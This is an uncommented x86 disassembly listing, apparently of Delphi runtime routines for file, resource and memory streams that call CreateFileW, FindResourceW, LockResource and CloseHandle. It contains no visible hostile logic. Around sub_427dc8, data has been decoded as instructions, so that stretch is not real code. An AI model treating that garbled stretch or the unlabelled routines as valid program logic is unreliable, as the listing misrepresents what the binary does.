mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42b9e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4276eb
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_4276f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42774c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_435c6c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_42778c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_43badc
pop ebx
pop ebp
retn 0x8
sub_4277b4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
movzx eax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_4277f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4277f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_427940
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_448694
movzx edx di
mov eax esi
call sub_435bbc
mov ecx eax
xor edx edx
mov eax ebx
call sub_4276f0
cmp [ ebx + 0x4 ] 0xffffffff
jne r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax esi
call sub_449db8
push eax
call CreateFileW
mov ecx eax
xor edx edx
mov eax ebx
call sub_4276f0
cmp [ ebx + 0x4 ] 0xffffffff
jne r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427947
lea eax [ ebp - 0x24 ]
mov edx 0x4
call j_sub_44936c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_435fc4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_439344
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_435fc4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_439344
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
jmp r-xdata
sub_427947
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42796c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4279a8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4476cc
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4279e0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_427a04
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_427a30
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_427a48
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_427294
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_4274c8
sub_427a80
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_4279a0
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_427aa8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_427a80
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_427ad4
push ebx
push ecx
mov ebx edx
cmp [ ebx ] 0x0
jle r-xdata
mov edx [ eax + 0x4 ]
mov [ esp ] edx
mov ecx [ ebx ]
mov edx [ eax + 0x10 ]
cmp ecx edx
je r-xdata
mov edx [ ebx ]
cmp edx [ eax + 0x8 ]
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebx ]
add edx 0x1fff
and edx 0xffffe000
mov [ ebx ] edx
test edx edx
jne r-xdata
mov eax [ eax + 0x4 ]
call sub_4474a8
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov edx [ ebx ]
mov eax esp
call sub_4474c0
mov eax [ ebx ]
call sub_44748c
mov [ esp ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
cmp [ esp ] 0x0
jne r-xdata
sub_427b54
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4476cc
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_427a80
sub_427ba4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
call sub_449db8
mov ecx eax
mov edx esi
mov eax edi
call sub_427c9c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_427bfc
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427c8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_449ed8
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_435628
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427c95
lea eax [ ebp - 0x10 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_427c9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceW
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_427bfc
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_4279a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebp
call sub_427bfc
pop ecx
sub_427d08
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_427d50
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_44748c
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_427d98
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4474a8
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_427dc8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ esi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
jle r-xdata
add ah al
push esi
inc esp
add [ eax ] dl
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + eax ] dl
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax + eax ] bl
add [ eax ] al
loopne r-xdata
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x7bffbb7f ] ah
jg r-xdata
imul edi [ eax + 0x75 ] 0x90909070
jo r-xdata
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x74004481 ] ah
jg r-xdata
adc al 0x8b
push ebp
or al ch
push ds
add al [ eax ]
add [ esi ] cl
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh [ esi + 0x42 ]
mov al [ 0x427e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x1c0042 ] ah
add [ eax ] al
les edi [ ebp + 0x42 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
inc edi
adc al 0xe8
cdq
jo r-xdata
movzx eax [ ebx ]
test ax ax
je r-xdata
outsb
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub ax 0x2e
jne r-xdata
push ds
add al [ eax ]
mov esi eax
mov ebx esi
jmp r-xdata
add al 0x24
add [ ebx - 0x6617ebb9 ] cl
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
sar ebp 0x1
jns r-xdata
add ebx 0x2
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_449d2c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_449d2c
add esp 0xfffffff0
call sub_448694
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_449e68
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_44a438
mov [ esp ] 0x1
adc ebp 0x0
sub_427eb4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_449d2c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_449d2c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_427f0c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov [ esp ] 0x0
mov eax [ edi + 0x14 ]
call sub_449db8
mov esi eax
mov ebx esi
jmp r-xdata
movzx eax [ ebx ]
test ax ax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub ax 0x2e
jne r-xdata
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
sar ebp 0x1
jns r-xdata
add ebx 0x2
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_449e68
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_44a438
mov [ esp ] 0x1
adc ebp 0x0
sub_427f84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_427ffb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_44b8d8
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4309c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428002
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_42f6b8
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov eax esi
pop edx
call sub_43c01c
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_44b8d8
sub_428008
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4280d5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4280dc
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov edi esi
mov eax ebx
call sub_449db8
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] edi
movzx eax [ ebx ]
test ax ax
je r-xdata
mov ecx ebx
sub ecx [ ebp - 0xc ]
sar ecx 0x1
jns r-xdata
add eax 0xffffffd3
sub ax 0x2
jae r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_449e68
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_42e7b0
mov esi eax
test esi esi
jne r-xdata
adc ecx 0x0
add ebx 0x2
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43501c
test al al
je r-xdata
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
add ebx 0x2
cmp [ ebx ] 0x3e
jne r-xdata
add ebx 0x2
mov edi esi
add ebx 0x2
sub_428100
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_424744
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_424744
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_424590
sub_428138
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_424744
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_424744
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4245dc
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_424590
sub_428180
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_42833c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_42831d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428324
mov eax [ rw-data ]
call sub_424bec
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4282fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4282ac
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4246e8
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4240cc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4282b3
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_42fadc
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_428100
pop ecx
mov edx esi
mov eax edi
call sub_4245dc
mov eax ebx
call sub_4481b0
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_428138
pop ecx
inc esi
push ebp
mov eax [ ebx + 0x4 ]
call sub_428138
pop ecx
inc esi
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_428008
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
jmp r-xdata
sub_4282b3
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4246e8
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_42834c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_4283e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
mov edx ebx
mov eax edi
call sub_4246e8
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4245dc
mov eax esi
call sub_4481b0
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43501c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4283f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_42846f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
mov edx ebx
mov eax edi
call sub_4246e8
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4245dc
mov eax esi
call sub_4481b0
sub_4284a0
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
pop ecx
pop edx
pop ebx
retn
sub_4284e4
push ebx
push esi
push edi
call sub_44873c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_427d98
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_428520
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42a7b4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_42a8c4
call sub_428494
sub_428544
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x80 ]
mov eax esi
call sub_43501c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x80 ]
xor edx edx
call sub_449d2c
sub_428580
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_43501c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a7b4
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42864a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_428a50
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_428a50
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428651
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42a8c4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
call sub_428494
sub_42867c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x62 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_4286a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_44858c
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
sete [ ebp - 0x9 ]
push esi
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov [ esi ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_428710
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ edi ]
mov edx esi
call sub_44858c
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
